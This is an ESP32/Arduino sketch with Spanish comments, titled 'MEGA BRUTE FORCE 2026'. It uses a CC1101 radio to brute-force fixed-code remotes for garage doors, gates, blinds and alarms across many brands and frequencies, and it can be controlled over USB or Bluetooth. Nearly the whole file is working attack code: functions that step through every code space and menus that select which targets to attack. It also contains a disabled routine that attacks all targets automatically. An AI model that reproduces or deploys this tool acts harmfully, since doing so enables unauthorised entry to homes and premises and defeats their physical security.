#include <Arduino.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <SPI.h>
#include <BluetoothSerial.h> 

// --- MEGA INCLUDES DE TODOS LOS PROTOCOLOS ---
#include "protocols/protocol.h"
#include "protocols/Came.h"
#include "protocols/NiceFlo.h"
#include "protocols/Ansonic.h"
#include "protocols/Chamberlain.h"
#include "protocols/Holtek.h"
#include "protocols/Linear.h"
#include "protocols/LinearMegaCode.h"
#include "protocols/Liftmaster.h"
#include "protocols/Princeton.h"
#include "protocols/EV1527.h"
#include "protocols/Doitrand.h"
#include "protocols/FAAC.h"
#include "protocols/StarLine.h"
#include "protocols/Clemsa.h"
#include "protocols/Dooya.h"
#include "protocols/Hormann.h"
#include "protocols/Marantec.h"
#include "protocols/SMC5326.h"
#include "protocols/Firefly.h"
#include "protocols/Tedsen.h"
#include "protocols/Nero.h"
#include "protocols/ELKA.h"
#include "protocols/Prastel.h"
#include "protocols/PhoenixV2.h"
#include "protocols/BFT.h"
#include "protocols/Airforce.h"
#include "protocols/Berner.h"
#include "protocols/IntertechnoV3.h"
#include "protocols/GateTX.h"
#include "protocols/Honeywell.h"
#include "protocols/Magellen.h"
#include "protocols/Phox.h"
#include "protocols/Unilarm.h"

#define RF2_CS   27
#define RF2_GDO0 26
#define RF2_TX   25 
#define FREQ_OFFSET 0.052 

// [NUEVO] Objeto Bluetooth
BluetoothSerial SerialBT;

int globalRepeats = 4;
float current_mhz = 0;
unsigned long lastInteraction = 0;

// --- WRAPPERS PARA DUAL OUTPUT (USB + BLUETOOTH) ---
void dualPrint(String s) {
    Serial.print(s);
    SerialBT.print(s);
}
void dualPrintln(String s) {
    Serial.println(s);
    SerialBT.println(s);
}
void dualPrintf(const char* format, ...) {
    char buf[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    Serial.write(buf);
    SerialBT.write((uint8_t*)buf, strlen(buf));
}

// --- WRAPPERS PARA DUAL INPUT ---
int anyAvailable() {
    return Serial.available() + SerialBT.available();
}
char anyRead() {
    if (Serial.available()) return Serial.read();
    if (SerialBT.available()) return SerialBT.read();
    return 0;
}
void clearBuffers() {
    while(Serial.available()) Serial.read();
    while(SerialBT.available()) SerialBT.read();
}

void setFrequencyCorrected(float target_mhz) {
    float corrected_mhz = target_mhz - FREQ_OFFSET;
    if (corrected_mhz == current_mhz) return;
    ELECHOUSE_cc1101.setMHZ(corrected_mhz);
    current_mhz = corrected_mhz;
    dualPrintf("\n[FREQ] RF2 -> Target: %.3f MHz | Software: %.3f MHz\n", target_mhz, corrected_mhz);
}

void setupCC1101() {
    SPI.begin(14, 12, 13);
    ELECHOUSE_cc1101.addSpiPin(14, 12, 13, RF2_CS, 1);
    ELECHOUSE_cc1101.addGDO0(RF2_GDO0, 1);
    ELECHOUSE_cc1101.setModul(1); 
    if (!ELECHOUSE_cc1101.getCC1101()) while (1) { dualPrintln("ERROR: CC1101 no detectado"); delay(1000); }
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setPktFormat(3);   
    ELECHOUSE_cc1101.setModulation(2);  
    ELECHOUSE_cc1101.setPA(10);         
    ELECHOUSE_cc1101.SetTx();           
    pinMode(RF2_TX, OUTPUT);
}

void sendPulse(int duration) {
    if (duration == 0) return;
    digitalWrite(RF2_TX, (duration > 0) ? HIGH : LOW);
    delayMicroseconds(abs(duration));
}

// Retorna: 0=Continuar, 1=Saltar Actual, 2=Cancelar Todo
int checkPause() {
    if (anyAvailable() > 0) {
        char c = anyRead();
        if (c == 'c' || c == 'C') {
            dualPrintln("\n[PAUSA] Opciones: (S)altar actual | (C)ancelar todo | (R)eanudar");
            while(anyAvailable() == 0) delay(10);
            char opt = anyRead();
            clearBuffers();
            if (opt == 'S' || opt == 's') { dualPrintln(">>> Saltando al siguiente..."); return 1; } // Skip current
            if (opt == 'C' || opt == 'c') { dualPrintln(">>> Cancelando todo."); return 2; } // Cancel all
            dualPrintln(">>> Reanudando...");
            return 0;
        }
    }
    return 0;
}

// Retorna false si se cancela TODO, true si termina o se salta
bool attackBinary(c_rf_protocol* proto, const char* name, int bits, float mhz) {
    setFrequencyCorrected(mhz);
    uint32_t total = (1 << bits);
    dualPrintf("\n>>> Iniciando %s (%d bits) a %.2f MHz <<<", name, bits, mhz);
    for (uint32_t i = 0; i < total; i++) {
        if (i % 500 == 0) dualPrintf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
        
        int status = checkPause();
        if (status == 1) return true; // Skip current
        if (status == 2) return false; // Cancel all

        for (int r = 0; r < globalRepeats; r++) {
            for (int p : proto->pilot_period) sendPulse(p);
            for (int b = bits - 1; b >= 0; b--) {
                char bitChar = ((i >> b) & 1) ? '1' : '0';
                if(proto->transposition_table.count(bitChar))
                    for (int t : proto->transposition_table[bitChar]) sendPulse(t);
            }
            for (int s : proto->stop_bit) sendPulse(s);
            digitalWrite(RF2_TX, LOW); delay(8);
        }
        yield();
    }
    return true;
}

bool attackTristate(c_rf_protocol* proto, const char* name, int positions, float mhz) {
    setFrequencyCorrected(mhz);
    uint32_t total = 1;
    for(int p=0; p<positions; p++) total *= 3;
    dualPrintf("\n>>> Iniciando %s (%d pos) a %.2f MHz <<<", name, positions, mhz);
    for (uint32_t i = 0; i < total; i++) {
        if (i % 500 == 0) dualPrintf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
        
        int status = checkPause();
        if (status == 1) return true; // Skip current
        if (status == 2) return false; // Cancel all

        uint32_t temp = i;
        for (int r = 0; r < globalRepeats; r++) {
            for (int p : proto->pilot_period) sendPulse(p);
            for (int p = 0; p < positions; p++) {
                int val = temp % 3;
                char code = (val == 0) ? '0' : (val == 1 ? '1' : 'F');
                if(proto->transposition_table.count(code))
                    for (int t : proto->transposition_table[code]) sendPulse(t);
                temp /= 3;
            }
            temp = i; 
            for (int s : proto->stop_bit) sendPulse(s);
            digitalWrite(RF2_TX, LOW); delay(8);
        }
        yield();
    }
    return true;
}

char waitKey() {
    while (anyAvailable() == 0) delay(10);
    char c = anyRead();
    clearBuffers();
    return c;
}

void subMenuRepeats() {
    dualPrintln("\n--- CONFIGURAR REPETICIONES ---");
    dualPrintf("Actual: %d veces por codigo\n", globalRepeats);
    dualPrintln("Introduce un numero (1-9):");
    char c = waitKey();
    if (c >= '1' && c <= '9') { globalRepeats = c - '0'; dualPrintf("OK! Ajustado a %d\n", globalRepeats); }
}

// --- SUBMENÚS POR CATEGORÍA ---

void menu1() {
    while(true) {
        dualPrintln("\n[1] MANDOS EUROPEOS (433.92)");
        dualPrintln("0. ATACAR TODO EL BLOQUE");
        dualPrintln("1. CAME (12 & 24 bits)");
        dualPrintln("2. NiceFlo (12 & 24 bits)");
        dualPrintln("3. Clemsa / FAAC / BFT / Ansonic");
        dualPrintln("4. Gate-TX / Phox / Prastel / PhoenixV2");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '0' || c == '1') { protocol_came p; if(!attackBinary(&p, "CAME 12b", 12, 433.92)) return; if(!attackBinary(&p, "CAME 24b", 24, 433.92)) return; }
        if (c == '0' || c == '2') { protocol_nice_flo p; if(!attackBinary(&p, "NiceFlo 12b", 12, 433.92)) return; if(!attackBinary(&p, "NiceFlo 24b", 24, 433.92)) return; }
        if (c == '0' || c == '3') { 
            protocol_clemsa p1; if(!attackBinary(&p1, "Clemsa", 12, 433.92)) return;
            protocol_faac p2; if(!attackBinary(&p2, "FAAC", 12, 433.92)) return;
            protocol_bft_fixed p3; if(!attackBinary(&p3, "BFT", 12, 433.92)) return;
            protocol_ansonic p4; if(!attackBinary(&p4, "Ansonic", 12, 433.92)) return;
        }
        if (c == '0' || c == '4') {
            protocol_gate_tx p1; if(!attackBinary(&p1, "GateTX", 12, 433.92)) return;
            protocol_phox p2; if(!attackBinary(&p2, "Phox", 12, 433.92)) return;
            protocol_prastel p3; if(!attackBinary(&p3, "Prastel", 12, 433.92)) return;
            protocol_phoenix_v2 p4; if(!attackBinary(&p4, "PhoenixV2", 12, 433.92)) return;
        }
    }
}

void menu2() {
    while(true) {
        dualPrintln("\n[2] MANDOS TRISTATE (Princeton/Chinos)");
        dualPrintln("0. ATACAR TODO (Princeton + SMC)");
        dualPrintln("1. Princeton (315 MHz)");
        dualPrintln("2. Princeton (433.92 MHz)");
        dualPrintln("3. SMC5326 (315 / 433.42 MHz)");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        protocol_princeton p1; protocol_smc5326 p2;
        if (c == '0' || c == '1') if(!attackTristate(&p1, "Princeton 315", 12, 315.00)) return;
        if (c == '0' || c == '2') if(!attackTristate(&p1, "Princeton 433", 12, 433.92)) return;
        if (c == '0' || c == '3') { if(!attackTristate(&p2, "SMC5326 315", 12, 315.00)) return; if(!attackTristate(&p2, "SMC5326 433", 12, 433.42)) return; }
    }
}

void menu3() {
    while(true) {
        dualPrintln("\n[3] DOMOTICA Y SENSORES");
        dualPrintln("1. Dooya (Persianas) - 433.92");
        dualPrintln("2. Honeywell WBD - 433.92");
        dualPrintln("3. Nero Radio / Nero Sketch");
        dualPrintln("4. Magellen - 433.92");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_dooya p; if(!attackBinary(&p, "Dooya", 24, 433.92)) return; }
        if (c == '2') { protocol_honeywell p; if(!attackBinary(&p, "Honeywell", 12, 433.92)) return; }
        if (c == '3') { protocol_nero p; if(!attackBinary(&p, "Nero Sketch", 12, 433.92)) return; if(!attackBinary(&p, "Nero Radio", 12, 434.42)) return; }
        if (c == '4') { protocol_magellen p; if(!attackBinary(&p, "Magellen", 12, 433.92)) return; }
    }
}

void menu4() {
    while(true) {
        dualPrintln("\n[4] USA GARAGE (Chamberlain/Liftmaster)");
        dualPrintln("1. Chamberlain 7,8,9,12 bits (300/315/390/433)");
        dualPrintln("2. Liftmaster (310/318/390/433)");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_chamberlain p; for(float f : {300.0, 315.0, 390.0, 433.92}) for(int b : {7, 8, 9, 12}) if(!attackBinary(&p, "Chamberlain", b, f)) return; }
        if (c == '2') { protocol_liftmaster p; for(float f : {310.0, 318.0, 390.0, 433.92}) if(!attackBinary(&p, "Liftmaster", 12, f)) return; }
    }
}

void menu5() {
    while(true) {
        dualPrintln("\n[5] AMERICANOS ANTIGUOS");
        dualPrintln("1. Linear (10 bits) - 300/310 MHz");
        dualPrintln("2. Linear Delta 3 - 318 MHz");
        dualPrintln("3. Linear MegaCode - 318 MHz");
        dualPrintln("4. Firefly - 300 MHz");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_linear p; if(!attackBinary(&p, "Linear 300", 10, 300.00)) return; if(!attackBinary(&p, "Linear 310", 10, 310.00)) return; }
        if (c == '2') { protocol_linear p; if(!attackBinary(&p, "Delta 3", 10, 318.00)) return; }
        if (c == '3') { protocol_linear_megacode p; if(!attackBinary(&p, "MegaCode", 24, 318.00)) return; }
        if (c == '4') { protocol_firefly p; if(!attackBinary(&p, "Firefly", 10, 300.00)) return; }
    }
}

void menu6() {
    while(true) {
        dualPrintln("\n[6] ALTA SEGURIDAD / 868 MHz");
        dualPrintln("1. Hormann HSM - 868.35 MHz");
        dualPrintln("2. Marantec - 868.35 MHz");
        dualPrintln("3. Berner - 868.35 MHz");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_hormann p; if(!attackBinary(&p, "Hormann", 12, 868.35)) return; }
        if (c == '2') { protocol_marantec p; if(!attackBinary(&p, "Marantec", 12, 868.35)) return; }
        if (c == '3') { protocol_berner p; if(!attackBinary(&p, "Berner", 12, 868.35)) return; }
    }
}

void menu7() {
    dualPrintln("\n[7] INICIANDO INTERTECHNO V3 (32 BITS)...");
    protocol_intertechno_v3 p; attackBinary(&p, "Intertechno", 32, 433.92);
}

void menu8() {
    dualPrintln("\n[8] INICIANDO ALARMAS 24 BITS (EV1527)...");
    protocol_ev1527 p; attackBinary(&p, "EV1527", 24, 433.92);
}

void menu9() {
    while(true) {
        dualPrintln("\n[9] OTROS PROTOCOLOS");
        dualPrintln("1. StarLine (Static)");
        dualPrintln("2. Unilarm");
        dualPrintln("3. Tedsen / Teletaster");
        dualPrintln("4. Airforce / Berner 433");
        dualPrintln("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_starline p; if(!attackBinary(&p, "StarLine", 12, 433.92)) return; }
        if (c == '2') { protocol_unilarm p; if(!attackBinary(&p, "Unilarm", 12, 433.42)) return; }
        if (c == '3') { protocol_tedsen p; if(!attackBinary(&p, "Tedsen", 12, 433.92)) return; }
        if (c == '4') { protocol_airforce p1; if(!attackBinary(&p1, "Airforce", 12, 433.92)) return; protocol_berner p2; if(!attackBinary(&p2, "Berner 433", 12, 433.92)) return; }
    }
}

void showMainMenu() {
    dualPrintln("\n==========================================");
    dualPrintln("   MEGA BRUTE FORCE 2026 - ULTIMATE      ");
    dualPrintln("   (Control via USB or BLUETOOTH)        ");
    dualPrintln("==========================================");
    dualPrintln("1. Europe Mandos (CAME, Nice, Clemsa...)");
    dualPrintln("2. Tristate / Chinos (Princeton, SMC...)");
    dualPrintln("3. Domotica / Persianas (Dooya, Nero...)");
    dualPrintln("4. USA Garage (Chamberlain, Liftmaster)");
    dualPrintln("5. USA Old (Linear, Firefly, MegaCode)");
    dualPrintln("6. Europe 868 MHz (Hormann, Marantec)");
    dualPrintln("7. Intertechno V3 (32 bits)");
    dualPrintln("8. Alarmas 24 bits (EV1527)");
    dualPrintln("9. Otros (StarLine, Tedsen, Airforce)");
    dualPrintln("R. Ajustar REPETICIONES (Actual: " + String(globalRepeats) + ")");
    dualPrintln("==========================================");
}

void attackEverything() {
    dualPrintln("\n[!] TIEMPO AGOTADO: AUTO-ATTACK (SPAIN & FASTEST FIRST)...");
    
    // 1. ESPAÑA / EUROPE 12 BITS (Rápidos)
    protocol_clemsa p_clemsa; if(!attackBinary(&p_clemsa, "Clemsa", 12, 433.92)) return;
    protocol_came p_came; if(!attackBinary(&p_came, "CAME 12b", 12, 433.92)) return;
    protocol_nice_flo p_nice; if(!attackBinary(&p_nice, "NiceFlo 12b", 12, 433.92)) return;
    protocol_faac p_faac; if(!attackBinary(&p_faac, "FAAC", 12, 433.92)) return;
    protocol_bft_fixed p_bft; if(!attackBinary(&p_bft, "BFT", 12, 433.92)) return;
    protocol_ansonic p_ansonic; if(!attackBinary(&p_ansonic, "Ansonic", 12, 433.92)) return;
    
    // 2. OTROS EUROPEOS 12 BITS
    protocol_gate_tx p_gate; if(!attackBinary(&p_gate, "GateTX", 12, 433.92)) return;
    protocol_phox p_phox; if(!attackBinary(&p_phox, "Phox", 12, 433.92)) return;
    protocol_prastel p_prastel; if(!attackBinary(&p_prastel, "Prastel", 12, 433.92)) return;
    protocol_phoenix_v2 p_phoenix; if(!attackBinary(&p_phoenix, "PhoenixV2", 12, 433.92)) return;
    
    // 3. TRISTATE / CHINOS
    protocol_princeton p_princeton; 
    if(!attackTristate(&p_princeton, "Princeton 433", 12, 433.92)) return;
    protocol_smc5326 p_smc;
    if(!attackTristate(&p_smc, "SMC5326 433", 12, 433.42)) return;

    // 4. LARGOS / DOMOTICA
    if(!attackBinary(&p_came, "CAME 24b", 24, 433.92)) return;
    if(!attackBinary(&p_nice, "NiceFlo 24b", 24, 433.92)) return;
    protocol_ev1527 p_ev; if(!attackBinary(&p_ev, "EV1527", 24, 433.92)) return;
    protocol_dooya p_dooya; if(!attackBinary(&p_dooya, "Dooya", 24, 433.92)) return;
    
    // 5. 868 MHz
    protocol_hormann p_hormann; if(!attackBinary(&p_hormann, "Hormann", 12, 868.35)) return;
    protocol_marantec p_marantec; if(!attackBinary(&p_marantec, "Marantec", 12, 868.35)) return;
    protocol_berner p_berner; if(!attackBinary(&p_berner, "Berner", 12, 868.35)) return;

    // 6. USA / RESTO
    protocol_chamberlain p_chamb; if(!attackBinary(&p_chamb, "Chamberlain", 12, 315.00)) return; if(!attackBinary(&p_chamb, "Chamberlain", 12, 390.00)) return;
    protocol_liftmaster p_lift; if(!attackBinary(&p_lift, "Liftmaster", 12, 315.00)) return; if(!attackBinary(&p_lift, "Liftmaster", 12, 390.00)) return;
    protocol_linear p_lin; if(!attackBinary(&p_lin, "Linear 300", 10, 300.00)) return;
}

void setup() {
    Serial.begin(115200);
    
    // [NUEVO] Iniciar Bluetooth
    // El nombre que veras en el movil es "Mega-Brute-Force-RF" 
    SerialBT.begin("Mega-Brute-Force-RF"); 
    
    delay(2000);
    setupCC1101();
    showMainMenu();
    lastInteraction = millis();
}

void loop() {
    if (anyAvailable() > 0) {
        char c = anyRead();
        clearBuffers(); // Limpiar el resto
        
        switch(c) {
            case '1': menu1(); break;
            case '2': menu2(); break;
            case '3': menu3(); break;
            case '4': menu4(); break;
            case '5': menu5(); break;
            case '6': menu6(); break;
            case '7': menu7(); break;
            case '8': menu8(); break;
            case '9': menu9(); break;
            case 'R': case 'r': subMenuRepeats(); break;
        }
        showMainMenu();
        lastInteraction = millis();
    } else {
        // if (millis() - lastInteraction > 90000) {
        //     attackEverything();
        //     lastInteraction = millis(); 
        //     showMainMenu();
        // }
    }
}
